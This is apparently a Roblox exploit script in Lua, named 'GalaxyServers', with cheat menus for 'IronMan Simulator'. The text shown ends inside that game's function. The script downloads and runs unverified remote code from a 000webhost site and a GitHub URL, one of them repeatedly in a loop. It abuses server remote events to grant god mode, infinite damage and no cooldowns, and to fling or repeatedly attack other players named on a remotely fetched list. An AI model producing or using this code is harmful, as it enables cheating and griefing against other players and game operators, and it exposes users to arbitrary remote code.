-- Making sure the game is loaded before doing anything.

repeat
    task.wait()
until game:IsLoaded()


-- Stopping new launches, whenever the script is already running.



-- Defining variables to store information.

local Testing = false
local wait = task.wait

local Version = "v1.2"
local Games = {
    ["IronMan Simulator"] = 1735775055,
    ["IronMan Simulator 2"] = 6097258548,
    ["IronMan Battlegrounds"] = 5890606049,
    ["Flee the Facility"] = 893973440,
    ["Destruction Simulator"] = 2248408710,
    ["SPFS"] = 2619187362,
    ["Vehicle Simulator"] = 171391948,
    ["Vehicle Tycoon"] = 1899149341,
    ["Age of Heros"] = 4866692557,
    ["Build a Boat"] = 537413528,
}

-- Initiating the game's library.

local Library = loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Lib%20UI"))()

-- Initiating the game's notification system.

local Notification = loadstring(game:HttpGet("https://galaxyproductions.000webhostapp.com/Notification"))()

getgenv()["IrisAd"] = true

-- Creating GalaxyServers Filesystem

local httpservice = game:GetService('HttpService')

local a = {
    rememberkey = true,
    key = '',
    -- If Having Any Problem Contact NotVeurects On Discord --
};

if not pcall(function()
    readfile('GalaxyServers_login.json') 
end) then 
    writefile('GalaxyServers_login.json',httpservice:JSONEncode(a))
end

-- Making the game's functions

function IronManSimulator()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Ironman Simulator"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local mainchet = Window:AddTab("General", {default = false})
    local pee = mainchet:AddSection("Main", {default = true})
    local ff = mainchet:AddSection("Suit", {default = true})
    local parts = mainchet:AddSection("Call Parts", {default = true})
    local chrome = mainchet:AddSection("Chrome Suit", {default = true})
    local rapid = mainchet:AddSection("Rapid Suit", {default = false})

    local combat = Window:AddTab("Combat", {default = false})
    local textboxes = combat:AddSection("TextBoxes", {default = true})
    local aura = combat:AddSection("Aura", {default = true})
    local click = combat:AddSection("Click", {default = true})
    local tele = combat:AddSection("Teleport", {default = true})
    local plr = combat:AddSection("Local Player", {default = true})

    local fun = Window:AddTab("Fun Stuff", {default = false})
    local main = fun:AddSection("Main", {default = true})

    local uni = Window:AddTab("Universal", {default = false})
    local esp = uni:AddSection("ESP", {default = true})
    local aimbot = uni:AddSection("Aimbot", {default = true})
    local hit = uni:AddSection("Hitbox Expander", {default = true})
    local chat = uni:AddSection("Chat Commands", {default = false})
    local buyer = uni:AddSection("Buyer Commands", {default = false})

    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})

    local value = false
    local Toggle = pee:AddToggle("Fling Punch", {flag = "Toggle_Flag", default = false}, function(s)
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].Strength = s and 25 or 1
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("No Cooldown", {flag = "Toggle_Flag", default = false}, function(s)
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].cooldownMult = s and math.huge or 1.3
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Instant Death Punch", {flag = "Toggle_Flag", default = false}, function(s)
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].Strength = s and math.huge or 1
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Confuse Punch", {flag = "Toggle_Flag", default = false}, function(s)
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].Strength = s and 0/0 or 1
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("God Punch", {flag = "Toggle_Flag", default = false}, function(s)
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].Strength = s and -math.huge or 1
            end)
        end
    end)

    local value = false 
    local Toggle = pee:AddToggle("Anti-Fling", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                for i,v in pairs(game.Players.LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                    if v:IsA("BodyAngularVelocity") then
                        v.MaxTorque = Vector3.new(0, 0, 0)
                        v:Destroy()
                    else
                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                    end
                    if v:IsA("BodyPosition") then
                        v.MaxForce = Vector3.new(0, 0, 0)
                        v:Destroy()
                    else
                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Infinite Power", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                game.Players.LocalPlayer.Character.Suit.Status.Power.Value = true
                game.Players.LocalPlayer.Character.Suit.Status.Charge.Value = math.huge
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("GodMode", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                if game:GetService("Players").LocalPlayer.Character.Suit.Status.Ejected.Value == false then
                    game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game:service('Players').LocalPlayer.Character.HumanoidRootPart,-math.huge)
                    game.Players.LocalPlayer.Character.Humanoid.Health = 4000
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Anti-Fling 2", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                if game:GetService("Players").LocalPlayer.Character.Suit.Status.Ejected.Value == false then
                    game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game:service('Players').LocalPlayer.Character.HumanoidRootPart,100000000000000000000000000000)
                end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Auto Refresh", {flag = "Toggle_Flag", default = false}, function(s)
    value = s
    if s then
        local g = game:service('RunService').Stepped:connect(function(s)
            if not value then
                return g:Disconnect()
            end
            if game.Players.LocalPlayer.Character.Humanoid.Health < 5 then
                local AutoRefresh = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("MeshPart") then
                        v:Destroy()
                    end
                end
                game:GetService("Players").LocalPlayer.Character.Humanoid:Destroy()
                wait(5.7)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(AutoRefresh)
            end
            end)
        end
    end)

    local value = false
    local Toggle = pee:AddToggle("Anti-Lag", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                local workspace = game.Workspace
                workspace.burnMark:remove()
                workspace.repulsorBeam:remove()
                workspace.bulletHole:remove()
                workspace.bulletHole:remove()
                workspace.bulletHole:remove()
                workspace.bulletHole:remove()
                workspace.bulletHole:remove()
            end)
        end
    end)

    local AutoLoopList = loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeurects/Solar/main/Autoloop.json"))()

    spawn(function()
        while wait() do
            AutoLoopList = loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeurects/Solar/main/Autoloop.json"))()
        end
    end)

    local list = {
        "LowerTorso",
        "UpperTorso",
        "Helmet",
        "LeftFoot",
        "LeftHand",
        "LeftLowerArm",
        "LeftLowerLeg",
        "LeftUpperArm",
        "LeftUpperLeg",
        "Mask",
        "RightFoot",
        "RightHand",
        "RightLowerArm",
        "RightLowerLeg",
        "RightUpperArm",
        "RightUpperLeg"
    }

    local value = false
    local Toggle = pee:AddToggle("Auto-Loop", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                for i,v in pairs(game.Players:GetPlayers()) do
                    if table.find(AutoLoopList, v.Name) then
                        for i,list in pairs(list) do
                            local args = {
                                [1] = "right",
                                [2] = Vector3.new(0, math.huge, 0),
                                [3] = Vector3.new(0, math.huge, 0),
                                [4] = 0.0034709799289703368,
                                [5] = 2000,
                                [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                                [7] = v.Character[list],
                            }
                            
                            game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                            local args = {
                                [1] = "right",
                                [2] = Vector3.new(0, 9e9, 0),
                                [3] = Vector3.new(0, 9e9, 0),
                                [4] = 0.0034709799289703368,
                                [5] = 2000,
                                [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                                [7] = v.Character[list],
                            }
                            
                            game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                            local args = {
                                [1] = "right",
                                [2] = Vector3.new(9e9, -9e9, 9e9),
                                [3] = Vector3.new(9e9, -9e9, 9e9),
                                [4] = 0.0034709799289703368,
                                [5] = 2000,
                                [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                                [7] = v.Character[list],
                            }
                            
                            game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                            local args = {
                                [1] = "right",
                                [2] = Vector3.new(math.huge, -9e9, math.huge),
                                [3] = Vector3.new(math.huge, -9e9, math.huge),
                                [4] = 0.0034709799289703368,
                                [5] = 2000,
                                [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                                [7] = v.Character[list],
                            }
                            
                            game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                            local args = {
                                [1] = "right",
                                [2] = Vector3.new(math.huge, -math.huge, math.huge, 9e9),
                                [3] = Vector3.new(math.huge, -math.huge, math.huge, 9e9),
                                [4] = 0.0034709799289703368,
                                [5] = 2000,
                                [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                                [7] = v.Character[list],
                            }
                            
                            game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                        end
                    end                        
                end
            end)
        end
    end)

    local Button = pee:AddButton("GodMode", function()
        for i = 1,35 do
            game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game:service('Players').LocalPlayer.Character.HumanoidRootPart,-math.huge)
            game.Players.LocalPlayer.Character.Humanoid.Health = 4000
        end
    end)

    local Button = pee:AddButton("Strong Melee", function()
        game.Players.LocalPlayer.Backpack.Melee.Server.attackSpeed.Value = 10
        local function strong()
            local copy = game.Players.LocalPlayer.Backpack.Melee.Client:Clone()
            copy.Parent = game.Players.LocalPlayer.Backpack.Melee
        end
        for i = 1,50 do 
            strong()
        end
    end)

    local Button = pee:AddButton("Anti-Fling 2", function()
        for i = 1,35 do
            game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game:service('Players').LocalPlayer.Character.HumanoidRootPart,100000000000000000000000000000)
        end
    end)

    local Toggle = ff:AddToggle("Send Helmet", {flag = "Toggle_Flag", default = false}, function(s)
        with_helm = s
    end)

    local Toggle = ff:AddToggle("Fix Minigun", {flag = "Toggle_Flag", default = false}, function(s)
        shared.autofix = s
        if shared.autofix then 
            local player = game:GetService('Players').LocalPlayer
            local character = player.Character
            spawn(function()
                while true do wait()
                    if not shared.autofix then 
                        break 
                    end
                    pcall(function()
                        character = player.Character
                        if character.Suit.Status.Model.Value ~= 'WarMachine1' then 
                            return 
                        end
                        local suit = character.Suit
                        local minigun = suit.UpperTorso.Gun
                        local mag = (character.HumanoidRootPart.Position-minigun.Position).Magnitude
                        if mag > 50 then
                            game:GetService('TweenService'):create(
                                minigun,
                                TweenInfo.new(0.1,Enum.EasingStyle.Sine),
                                {
                                    CFrame = CFrame.new(character.HumanoidRootPart.Position+Vector3.new(0,2,0))
                                }
                            ):Play()
                        end
                    end)
                end
            end)
        end
    end)

    local value = false
    local Toggle = ff:AddToggle("Auto Unbreakable", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players.LocalPlayer.Character.Suit.RightHand.Equipped.Value == true or game.Players.LocalPlayer.Character.Suit.UpperTorso.Equipped.Value == true then
                    game.Players.LocalPlayer.Character.Suit.Status.damageTaken:Destroy()
                end
            end)
        end
    end)

    local send = Instance.new("Part",game.Workspace)
    send.Position = Vector3.new(285, 1074, -881)
    send.Anchored = true
    send.Size = Vector3.new(55, 5, 55)
    send.Transparency = 0.9
    send.TopSurface = Enum.SurfaceType.Studs
    send.BottomSurface = Enum.SurfaceType.Studs
    local value = false
    local Toggle = ff:AddToggle("Auto Call Suit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players.LocalPlayer.Character.ForceField then
                    for i,v in pairs(game.Players.LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
                        if v:IsA("BodyVelocity") then
                            v.MaxForce = Vector3.new(0, 0, 0)
                            v:Destroy()
                        else
                            game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                            game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        end
                        if v:IsA("BodyThrust") then
                            v.Force = Vector3.new(0, 0, 0)
                            v:Destroy()
                        else
                            game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                            game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        end
                        if v:IsA("BodyForce") then
                            v.Force = Vector3.new(0, 0, 0)
                            v:Destroy()
                        else
                            game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                            game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        end
                    end
                    game.Players.LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark33", tick(), 0)
                    local function a(a2) 
                        game.Players.LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer(a2) 
                    end
                    local a3 = {
                        'UpperTorso',
                        'LowerTorso',
                        'LeftUpperArm',
                        'RightUpperArm',
                        'LeftLowerArm',
                        'RightLowerArm',
                        'LeftHand',
                        'RightHand',
                        'RightUpperLeg',
                        'LeftUpperLeg',
                        'LeftLowerLeg',
                        'RightLowerLeg',
                        'LeftFoot',
                        'RightFoot',
                    }
                    if with_helm then
                        table.insert(a3,'Helmet')
                        table.insert(a3,'Mask')
                    end
                    for _,v in pairs(a3) do 
                        a(v) 
                    end
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(285, 1079, -882)
                end
            end)
        end
    end)

    local Bind = ff:AddBind("Instant Suit", Enum.KeyCode.Q, {toggleable = false, default = false, flag = "Bind_Flag"}, function(keycode)
        local function a(a2) 
            game.Players.LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer(a2) 
        end
        local a3 = {
            'UpperTorso',
            'LowerTorso',
            'LeftUpperArm',
            'RightUpperArm',
            'LeftLowerArm',
            'RightLowerArm',
            'LeftHand',
            'RightHand',
            'RightUpperLeg',
            'LeftUpperLeg',
            'LeftLowerLeg',
            'RightLowerLeg',
            'LeftFoot',
            'RightFoot',
        }
        if with_helm then
            table.insert(a3,'Helmet')
            table.insert(a3,'Mask')
        end
        for _,v in pairs(a3) do 
            a(v) 
        end
    end)

    local Button = ff:AddButton("Unbreakable", function()
        local lp = game.Players.LocalPlayer
        local lpc = lp.Character
        if lpc:FindFirstChild'Suit' then
            if lpc.Suit.Status:FindFirstChild'damageTaken' then
                lpc.Suit.Status.damageTaken:Destroy()
            end
        end
    end)

    local Button = ff:AddButton("Strong Blasts", function()
        local player = game.Players.LocalPlayer
        local backpack = player.Backpack
        if backpack:FindFirstChild('suitControl') then 
            local clone = backpack.suitControl.Client:Clone()
            clone.Parent = backpack.suitControl
        end
    end)

    local UniBeamToggle = false
    local Toggle = ff:AddToggle("Uni-Beam", {flag = "Toggle_Flag", default = false}, function(s)
        UniBeamToggle = s
    end)

    ff:AddLabel("Hold 'T' to activate")

    local KeyDown = false
    function laser()
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = "left",
        [2] = game.Players.LocalPlayer:GetMouse().hit.p,
        [3] = game.Players.LocalPlayer.Character.Suit.RightHand.Thruster.Position,
        [4] = 0.007286439418792725,
        [5] = 2000,
        [6] = game.Players.LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
        [7] = game.Players.LocalPlayer:GetMouse().Target
    }

    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = "left",
        [2] = game.Players.LocalPlayer:GetMouse().hit.p,
        [3] = game.Players.LocalPlayer.Character.Suit.LeftHand.Thruster.Position,
        [4] = 0.007286439418792725,
        [5] = 2000,
        [6] = game.Players.LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
        [7] = game.Players.LocalPlayer:GetMouse().Target
    }

    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
    end
    end
    end)
    game:service('RunService').Heartbeat:connect(function(s)
    if KeyDown == true then
    if UniBeamToggle == true then
    local args = {
        [1] = "left",
        [2] = game.Players.LocalPlayer:GetMouse().hit.p,
        [3] = game.Players.LocalPlayer.Character.Suit.UpperTorso.Reactor.Position,
        [4] = 0.007286439418792725,
        [5] = 2000,
        [6] = game.Players.LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
        [7] = game.Players.LocalPlayer:GetMouse().Target
    }

    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
    end
    end
        end)
    end
    local x = 0
    local me = game.Players.LocalPlayer.Name
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = true;
    Player = game:GetService("Players").LocalPlayer.Name
    AnimationId = "1746432470"
    local Anim = Instance.new("Animation")
    Anim.AnimationId = "rbxassetid://"..AnimationId
    local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim)
    if UniBeamToggle == true then
    k:Play() 
    k:AdjustSpeed(1)
    end
    if x ~= 1 then
        laser()
        x = x +1
    end
    while wait() do
        if KeyDown == false then
            k:Stop()
            end
        end
    end
    end)
    mouse.KeyUp:connect(function (key)
    if(key:byte() == 116) then
    KeyDown = false;
    end
    end)

    local Dropdown = ff:AddDropdown("Call Suit", {"Mark2", "Mark3", "Mark4", "Mark6", "Mark9", "Mark12", "Mark13", "Mark14", "Mark19", "Mark20", "Mark21", "Mark23", "Mark27", "Mark28", "Mark30", "Mark31", "Mark33", "Mark40", "Mark42", "WarMachine"}, {default = "None"}, function(asda)
        pcall(function()
            
            if asda == "Mark2" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark2", tick(), 0)
            end

            if asda == "Mark3" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark3", tick(), 0)
            end

            if asda == "Mark4" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark4", tick(), 0)
            end

            if asda == "Mark6" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark6", tick(), 0)
            end

            if asda == "Mark9" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark9", tick(), 0)
            end

            if asda == "Mark12" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark12", tick(), 0)
            end

            if asda == "Mark13" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark13", tick(), 0)
            end

            if asda == "Mark14" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark14", tick(), 0)
            end

            if asda == "Mark19" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark19", tick(), 0)
            end

            if asda == "Mark20" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark20", tick(), 0)
            end

            if asda == "Mark21" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark21", tick(), 0)
            end

            if asda == "Mark23" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark23", tick(), 0)
            end

            if asda == "Mark27" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark27", tick(), 0)
            end

            if asda == "Mark28" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark28", tick(), 0)
            end

            if asda == "Mark30" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark30", tick(), 0)
            end

            if asda == "Mark31" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark31", tick(), 0)
            end

            if asda == "Mark33" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark33", tick(), 0)
            end

            if asda == "Mark40" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark40", tick(), 0)
            end

            if asda == "Mark42" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("Mark42", tick(), 0)
            end

            if asda == "WarMachine" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callSuit:FireServer("WarMachine1", tick(), 0)
            end

        end)
    end)

    local Dropdown = parts:AddDropdown("Call Part", {"Helmet", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}, {default = "None"}, function(asda)
        pcall(function()
            
            if asda == "Helmet" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("Helmet")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("Mask")
            end

            if asda == "Torso" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("UpperTorso")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LowerTorso")
            end

            if asda == "Left Arm" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftUpperArm")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftLowerArm")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftHand")
            end

            if asda == "Right Arm" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightUpperArm")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightLowerArm")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightHand")
            end

            if asda == "Left Leg" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftUpperLeg")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftLowerLeg")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("LeftFoot")
            end

            if asda == "Right Leg" then
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightUpperLeg")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightLowerLeg")
                game:GetService("Players").LocalPlayer.Backpack.ironMan.Assets.Events.callPiece:FireServer("RightFoot")
            end

        end)
    end)

    local Dropdown = chrome:AddDropdown("Chrome Part", {"UpperTorso", "LowerTorso", "LeftLowerLeg", "LeftUpperLeg", "RightUpperLeg", "RightLowerLeg", "LeftUpperArm", "LeftLowerArm", "RightUpperArm", "RightLowerArm", "LeftHand", "RightHand", "LeftFoot", "RightFoot"}, {default = "None"}, function(asda)
        pcall(function()
            
            if asda == "UpperTorso" then
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union:Destroy()
            end

            if asda == "LeftUpperArm" then
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Part:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union:Destroy()
            end

            if asda == "RightUpperArm" then
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Part:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Union:Destroy()
            end

            if asda == "RightLowerArm" then
                game.Players.LocalPlayer.Character.Suit.RightLowerArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightLowerArm.Union:Destroy()
            end

            if asda == "LeftLowerArm" then
                game.Players.LocalPlayer.Character.Suit.LeftLowerArm.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftLowerArm.Union:Destroy()
            end

            if asda == "LeftHand" then
                game.Players.LocalPlayer.Character.Suit.LeftHand.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftHand.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftHand.Union:Destroy()
            end

            if asda == "RightHand" then
                game.Players.LocalPlayer.Character.Suit.RightHand.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightHand.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightHand.Union:Destroy()
            end

            if asda == "LowerTorso" then
                game.Players.LocalPlayer.Character.Suit.LowerTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LowerTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LowerTorso.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LowerTorso.Union:Destroy()
            end

            if asda == "RightUpperLeg" then
                game.Players.LocalPlayer.Character.Suit.RightUpperLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightUpperLeg.Part:Destroy()
            end

            if asda == "LeftUpperLeg" then
                game.Players.LocalPlayer.Character.Suit.LeftUpperLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftUpperLeg.Part:Destroy()
            end

            if asda == "RightLowerLeg" then
                game.Players.LocalPlayer.Character.Suit.RightLowerLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightLowerLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.RightLowerLeg.Union:Destroy()
            end

            if asda == "LeftLowerLeg" then
                game.Players.LocalPlayer.Character.Suit.LeftLowerLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftLowerLeg.Union:Destroy()
                game.Players.LocalPlayer.Character.Suit.LeftLowerLeg.Union:Destroy()
            end

            if asda == "RightFoot" then
                game.Players.LocalPlayer.Character.Suit.RightFoot.Union:Destroy()
            end

            if asda == "LeftFoot" then
                game.Players.LocalPlayer.Character.Suit.LeftFoot.Union:Destroy()
            end

        end)
    end)

    local Button = chrome:AddButton("Chrome All", function()
        for i,v in pairs(game.Players.LocalPlayer.Character.Suit:GetDescendants()) do
            if v.Name == "Union" then
                v:remove()
            end
        end
        game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Part:remove()
        game.Players.LocalPlayer.Character.Suit.RightUpperArm.Part:remove()
    end)

    local value = false
    local Toggle = chrome:AddToggle("Auto Chrome Suit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                for i,v in pairs(game.Players.LocalPlayer.Character.Suit:GetDescendants()) do
                    if v.Name == "Union" then
                        v:remove()
                    end
                end
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Part:remove()
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Part:remove()
            end)
        end
    end)

